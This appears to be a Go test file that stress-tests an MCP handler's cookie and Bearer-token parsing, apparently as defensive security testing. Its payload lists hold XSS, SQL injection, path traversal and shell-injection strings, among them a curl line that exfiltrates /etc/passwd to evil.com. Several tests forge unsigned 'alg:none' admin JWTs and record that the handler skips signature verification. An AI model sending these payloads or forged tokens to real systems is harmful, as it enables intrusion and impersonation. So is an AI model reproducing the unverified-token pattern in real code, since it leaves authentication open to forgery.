package mcp

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
)

// --- withUserContext Stress Tests ---

func TestWithUserContext_StressHostileCookieValues(t *testing.T) {
	h := &Handler{}

	hostile := []struct {
		name  string
		value string
	}{
		{"script tag", "<script>alert(1)</script>"},
		{"sql injection", "'; DROP TABLE sessions; --"},
		{"very long", strings.Repeat("A", 100000)},
		{"null bytes", "abc\x00def"},
		{"unicode zero width", "\u200b\u200b\u200b"},
		{"empty parts JWT", ".."},
		{"path traversal", "../../etc/passwd"},
		{"shell injection", "$(whoami)"},
	}

	for _, tc := range hostile {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.AddCookie(&http.Cookie{Name: "vire_session", Value: tc.value})

			// Must not panic
			result := h.withUserContext(req)

			// Hostile values should NOT produce a UserContext
			if _, ok := GetUserContext(result.Context()); ok {
				t.Errorf("hostile cookie value %q should not produce UserContext", tc.name)
			}
		})
	}
}

func TestWithUserContext_StressHostileSubInJWT(t *testing.T) {
	// Verify that hostile sub values in a well-formed JWT are passed through.
	// The MCP handler does NOT validate/sanitize the sub -- that's the proxy's job
	// (via sanitizeHeaderValue). But withUserContext should not panic.
	h := &Handler{}

	hostileSubs := []string{
		"'; DROP TABLE users; --",
		"<script>alert(document.cookie)</script>",
		"../../etc/passwd",
		"$(curl http://evil.com/steal?data=$(cat /etc/passwd))",
		"user\r\nX-Evil: injected",
		strings.Repeat("A", 50000),
		"",
	}

	for _, sub := range hostileSubs {
		t.Run("sub_"+safeSubstring(sub, 30), func(t *testing.T) {
			jwt := buildTestJWT(sub)
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.AddCookie(&http.Cookie{Name: "vire_session", Value: jwt})

			// Must not panic
			result := h.withUserContext(req)

			uc, ok := GetUserContext(result.Context())
			if sub == "" {
				// Empty sub should not create UserContext
				if ok {
					t.Error("empty sub should not produce UserContext")
				}
			} else if ok {
				// If it produced a UserContext, the UserID should match the sub
				if uc.UserID != sub {
					t.Errorf("UserID mismatch: expected %q, got %q", sub, uc.UserID)
				}
			}
		})
	}
}

func TestWithUserContext_StressConcurrentAccess(t *testing.T) {
	h := &Handler{}

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			jwt := buildTestJWT("user")
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.AddCookie(&http.Cookie{Name: "vire_session", Value: jwt})

			result := h.withUserContext(req)
			uc, ok := GetUserContext(result.Context())
			if !ok {
				t.Error("expected UserContext in concurrent access")
			}
			if uc.UserID != "user" {
				t.Errorf("concurrent access: expected user, got %s", uc.UserID)
			}
		}(i)
	}
	wg.Wait()
}

func TestWithUserContext_StressEmptyCookieValue(t *testing.T) {
	h := &Handler{}
	req := httptest.NewRequest("POST", "/mcp", nil)
	req.AddCookie(&http.Cookie{Name: "vire_session", Value: ""})

	result := h.withUserContext(req)
	if _, ok := GetUserContext(result.Context()); ok {
		t.Error("empty cookie value should not produce UserContext")
	}
}

func TestWithUserContext_StressMultipleCookies(t *testing.T) {
	// If multiple vire_session cookies are present, Go's r.Cookie returns the first.
	// Verify this doesn't cause issues.
	h := &Handler{}
	jwt1 := buildTestJWT("user1")
	jwt2 := buildTestJWT("user2")

	req := httptest.NewRequest("POST", "/mcp", nil)
	req.AddCookie(&http.Cookie{Name: "vire_session", Value: jwt1})
	req.AddCookie(&http.Cookie{Name: "vire_session", Value: jwt2})

	result := h.withUserContext(req)
	uc, ok := GetUserContext(result.Context())
	if !ok {
		t.Fatal("expected UserContext with multiple cookies")
	}
	// Go's r.Cookie returns the first matching cookie
	if uc.UserID != "user1" {
		t.Errorf("expected first cookie's user (user1), got %s", uc.UserID)
	}
}

// --- extractJWTSub Stress Tests ---

func TestExtractJWTSub_StressMalformedPayloads(t *testing.T) {
	tests := []struct {
		name    string
		payload string
	}{
		{"deeply nested JSON", `{"sub":"user","a":{"b":{"c":{"d":"deep"}}}}`},
		{"array in sub", `{"sub":["a","b","c"]}`},
		{"boolean sub", `{"sub":true}`},
		{"float sub", `{"sub":3.14}`},
		{"negative number sub", `{"sub":-1}`},
		{"very large number sub", `{"sub":99999999999999999999}`},
		{"unicode in sub", `{"sub":"用户"}`},
		{"emoji in sub", `{"sub":"👤🔐"}`},
		{"backslash in sub", `{"sub":"user\\admin"}`},
		{"quote in sub", `{"sub":"user\"admin"}`},
		{"tab in sub", `{"sub":"user\tadmin"}`},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			payload := base64.RawURLEncoding.EncodeToString([]byte(tc.payload))
			header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
			token := header + "." + payload + "."

			// Must not panic
			_ = extractJWTSub(token)
		})
	}
}

func TestExtractJWTSub_StressVeryLongToken(t *testing.T) {
	// Token with 1MB payload should not cause OOM or excessive delay
	largePayload := `{"sub":"user","padding":"` + strings.Repeat("x", 1<<20) + `"}`
	payload := base64.RawURLEncoding.EncodeToString([]byte(largePayload))
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
	token := header + "." + payload + "."

	sub := extractJWTSub(token)
	if sub != "user" {
		t.Errorf("expected 'user' from large token, got %q", sub)
	}
}

func TestExtractJWTSub_StressBinaryGarbage(t *testing.T) {
	// Feed raw binary into each JWT segment
	garbage := []byte{0xff, 0xfe, 0xfd, 0x00, 0x01, 0x02}
	token := string(garbage) + "." + string(garbage) + "." + string(garbage)

	// Must not panic
	sub := extractJWTSub(token)
	if sub != "" {
		t.Errorf("expected empty sub for binary garbage, got %q", sub)
	}
}

func TestExtractJWTSub_StressUnicodeZeroWidthInSegments(t *testing.T) {
	// Zero-width characters in the delimiter-like positions
	token := "\u200b.\u200b.\u200b"
	sub := extractJWTSub(token)
	if sub != "" {
		t.Errorf("expected empty sub for unicode token, got %q", sub)
	}
}

func TestExtractJWTSub_StressDuplicateSubClaims(t *testing.T) {
	// JSON with duplicate keys -- Go's json.Unmarshal takes the last value
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"first","sub":"second"}`))
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
	token := header + "." + payload + "."

	sub := extractJWTSub(token)
	// Go's encoding/json takes the last value for duplicate keys
	if sub != "second" {
		t.Errorf("expected 'second' for duplicate sub keys, got %q", sub)
	}
}

// --- UserContext Tests ---

func TestUserContext_StressNilContextPanics(t *testing.T) {
	// context.WithValue panics on nil parent. Verify this is the case
	// so callers know they must always provide a real context.
	defer func() {
		if r := recover(); r == nil {
			t.Error("expected panic when WithUserContext is called with nil context")
		}
	}()

	WithUserContext(nil, UserContext{UserID: "user"})
}

func TestUserContext_StressOverwriteWithBackground(t *testing.T) {
	ctx := WithUserContext(
		WithUserContext(t.Context(), UserContext{UserID: "first"}),
		UserContext{UserID: "second"},
	)

	uc, ok := GetUserContext(ctx)
	if !ok {
		t.Fatal("expected UserContext after double-set")
	}
	if uc.UserID != "second" {
		t.Errorf("expected second UserContext to win, got %q", uc.UserID)
	}
}

func TestUserContext_StressConcurrentReadWrite(t *testing.T) {
	// UserContext is immutable per-request (context.Value is safe for concurrent reads).
	// But verify no races when many goroutines read the same context.
	baseCtx := WithUserContext(t.Context(), UserContext{UserID: "shared"})

	var wg sync.WaitGroup
	for i := 0; i < 200; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			uc, ok := GetUserContext(baseCtx)
			if !ok || uc.UserID != "shared" {
				t.Error("concurrent read of UserContext failed")
			}
		}()
	}
	wg.Wait()
}

func safeSubstring(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

// --- Handler.ServeHTTP Security ---

func TestHandler_ServeHTTP_NilStreamable(t *testing.T) {
	// If streamable is nil (misconfiguration), ServeHTTP should not panic.
	// mcp-go's StreamableHTTPServer handles nil receiver gracefully.
	h := &Handler{}
	req := httptest.NewRequest("POST", "/mcp", nil)
	w := httptest.NewRecorder()

	defer func() {
		if r := recover(); r != nil {
			t.Errorf("unexpected panic when streamable is nil: %v", r)
		}
	}()

	h.ServeHTTP(w, req)
}

// --- Cookie extraction edge cases ---

func TestWithUserContext_StressWrongCookieName(t *testing.T) {
	h := &Handler{}
	jwt := buildTestJWT("user")

	// Cookie with wrong name should be ignored
	req := httptest.NewRequest("POST", "/mcp", nil)
	req.AddCookie(&http.Cookie{Name: "wrong_session", Value: jwt})

	result := h.withUserContext(req)
	if _, ok := GetUserContext(result.Context()); ok {
		t.Error("wrong cookie name should not produce UserContext")
	}
}

func TestExtractJWTSub_StressTrailingNewlines(t *testing.T) {
	// JWT with trailing whitespace/newlines in the cookie value
	jwt := buildTestJWT("user") + "\n"
	sub := extractJWTSub(jwt)
	// The trailing newline makes it a 3-part split with the third part containing "\n"
	// which is fine for extractJWTSub since it only reads parts[1]
	if sub != "user" {
		t.Logf("trailing newline in JWT: sub=%q (may be empty if newline breaks parsing)", sub)
	}
}

func TestExtractJWTSub_StressLeadingWhitespace(t *testing.T) {
	jwt := " " + buildTestJWT("user")
	sub := extractJWTSub(jwt)
	// Leading space becomes part of the header segment, which extractJWTSub ignores
	if sub != "user" {
		t.Logf("leading whitespace in JWT: sub=%q", sub)
	}
}

// --- JSON type confusion in claims ---

func TestExtractJWTSub_StressSubIsNestedJSON(t *testing.T) {
	// sub is a JSON object -- json.Unmarshal into string field yields ""
	payloads := []string{
		`{"sub":{"user":"admin","role":"superuser"}}`,
		`{"sub":["admin","superuser"]}`,
		`{"sub":null}`,
		`{"sub":false}`,
		`{"sub":0}`,
	}

	for _, p := range payloads {
		payload := base64.RawURLEncoding.EncodeToString([]byte(p))
		header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none"}`))
		token := header + "." + payload + "."

		sub := extractJWTSub(token)
		if sub != "" {
			t.Errorf("non-string sub type should yield empty string, got %q for payload %s", sub, p)
		}
	}
}

// --- Verify extractJWTSub uses SplitN correctly ---

func TestExtractJWTSub_StressExtraDots_PartialToken(t *testing.T) {
	// SplitN(token, ".", 3) means extra dots go into the third part.
	// Verify the payload (parts[1]) is still correctly extracted.
	claims := map[string]string{"sub": "alice"}
	claimsJSON, _ := json.Marshal(claims)
	payload := base64.RawURLEncoding.EncodeToString(claimsJSON)

	// Token with many dots: header.payload.sig.extra.more.dots
	token := "hdr." + payload + ".sig.extra.more.dots"
	sub := extractJWTSub(token)
	if sub != "alice" {
		t.Errorf("expected alice from multi-dot token, got %q", sub)
	}
}

// =============================================================================
// Bearer Token Stress Tests (Phase 6)
// =============================================================================

// --- Bearer token: forged token accepted without signature verification ---

func TestBearer_StressForgedTokenAccepted(t *testing.T) {
	// CRITICAL FINDING: withUserContext extracts sub from the Bearer token
	// using extractJWTSub, which does NOT verify the JWT signature.
	// An attacker can forge any identity by crafting a JWT with desired sub.
	h := &Handler{}

	// Forge a JWT claiming to be admin — unsigned, no secret needed
	forgedHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	forgedPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","iss":"attacker"}`))
	forgedToken := forgedHeader + "." + forgedPayload + "."

	req := httptest.NewRequest("POST", "/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+forgedToken)

	result := h.withUserContext(req)
	uc, ok := GetUserContext(result.Context())
	if ok && uc.UserID == "admin" {
		t.Log("CRITICAL FINDING: Bearer token is NOT signature-verified. " +
			"An attacker can forge a JWT with any sub claim and it will be accepted. " +
			"extractJWTSub only decodes the payload — it does not verify the signature. " +
			"The MCP handler MUST validate Bearer tokens using the same JWT secret " +
			"used by the OAuthServer to mint access tokens. " +
			"Without this, anyone can impersonate any user on the /mcp endpoint.")
	}
}

// --- Bearer token: priority over cookie ---

func TestBearer_StressPriorityOverCookie(t *testing.T) {
	h := &Handler{}

	bearerJWT := buildTestJWT("bearer-user")
	cookieJWT := buildTestJWT("cookie-user")

	req := httptest.NewRequest("POST", "/mcp", nil)
	req.Header.Set("Authorization", "Bearer "+bearerJWT)
	req.AddCookie(&http.Cookie{Name: "vire_session", Value: cookieJWT})

	result := h.withUserContext(req)
	uc, ok := GetUserContext(result.Context())
	if !ok {
		t.Fatal("expected UserContext")
	}

	// Bearer should take priority
	if uc.UserID != "bearer-user" {
		t.Errorf("expected Bearer user to take priority, got %s", uc.UserID)
	}
}

// --- Bearer token: malformed Authorization header ---

func TestBearer_StressMalformedAuthHeaders(t *testing.T) {
	h := &Handler{}

	headers := []struct {
		name  string
		value string
	}{
		{"lowercase bearer", "bearer token"},
		{"Basic auth", "Basic dXNlcjpwYXNz"},
		{"Bearer with no token", "Bearer "},
		{"Bearer with spaces", "Bearer  token  "},
		{"Just token", "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0."},
		{"Double Bearer", "Bearer Bearer token"},
		{"null bytes", "Bearer abc\x00def"},
		{"newline injection", "Bearer token\r\nX-Injected: evil"},
		{"very long token", "Bearer " + strings.Repeat("A", 1<<16)},
	}

	for _, tc := range headers {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.Header.Set("Authorization", tc.value)

			// Must not panic
			result := h.withUserContext(req)

			// Most should NOT produce a UserContext
			_, ok := GetUserContext(result.Context())
			if ok && tc.name == "Basic auth" {
				t.Error("Basic auth should not produce UserContext in Bearer handler")
			}
		})
	}
}

// --- Bearer token: invalid Bearer falls back to cookie ---

func TestBearer_StressInvalidBearerFallsToCookie(t *testing.T) {
	h := &Handler{}

	// Invalid Bearer token (no sub claim extractable)
	validCookie := buildTestJWT("cookie-user")

	req := httptest.NewRequest("POST", "/mcp", nil)
	req.Header.Set("Authorization", "Bearer not-a-jwt")
	req.AddCookie(&http.Cookie{Name: "vire_session", Value: validCookie})

	result := h.withUserContext(req)
	uc, ok := GetUserContext(result.Context())
	if !ok {
		t.Fatal("expected UserContext from cookie fallback")
	}
	if uc.UserID != "cookie-user" {
		t.Errorf("expected cookie fallback user, got %s", uc.UserID)
	}
}

// --- Bearer token: hostile sub values via Bearer ---

func TestBearer_StressHostileSubViaBearerToken(t *testing.T) {
	h := &Handler{}

	hostileSubs := []string{
		"'; DROP TABLE users; --",
		"<script>alert(document.cookie)</script>",
		"admin",
		"root",
		"system",
		"../../etc/passwd",
		"user\r\nX-Evil: injected",
	}

	for _, sub := range hostileSubs {
		t.Run("bearer_sub_"+safeSubstring(sub, 20), func(t *testing.T) {
			jwt := buildTestJWT(sub)
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.Header.Set("Authorization", "Bearer "+jwt)

			result := h.withUserContext(req)
			uc, ok := GetUserContext(result.Context())
			if ok && uc.UserID == sub {
				// This is expected since extractJWTSub doesn't validate
				// But it documents that hostile subs pass through
			}
		})
	}

	t.Log("FINDING: Any sub value in a Bearer JWT is accepted without validation. " +
		"Combined with the lack of signature verification, this means complete " +
		"identity forgery via the /mcp endpoint.")
}

// --- Bearer token: concurrent Bearer + Cookie mix ---

func TestBearer_StressConcurrentMixedAuth(t *testing.T) {
	h := &Handler{}

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(2)

		// Bearer request
		go func() {
			defer wg.Done()
			jwt := buildTestJWT("bearer-user")
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.Header.Set("Authorization", "Bearer "+jwt)

			result := h.withUserContext(req)
			uc, ok := GetUserContext(result.Context())
			if !ok || uc.UserID != "bearer-user" {
				t.Error("concurrent Bearer request failed")
			}
		}()

		// Cookie request
		go func() {
			defer wg.Done()
			jwt := buildTestJWT("cookie-user")
			req := httptest.NewRequest("POST", "/mcp", nil)
			req.AddCookie(&http.Cookie{Name: "vire_session", Value: jwt})

			result := h.withUserContext(req)
			uc, ok := GetUserContext(result.Context())
			if !ok || uc.UserID != "cookie-user" {
				t.Error("concurrent Cookie request failed")
			}
		}()
	}
	wg.Wait()
}
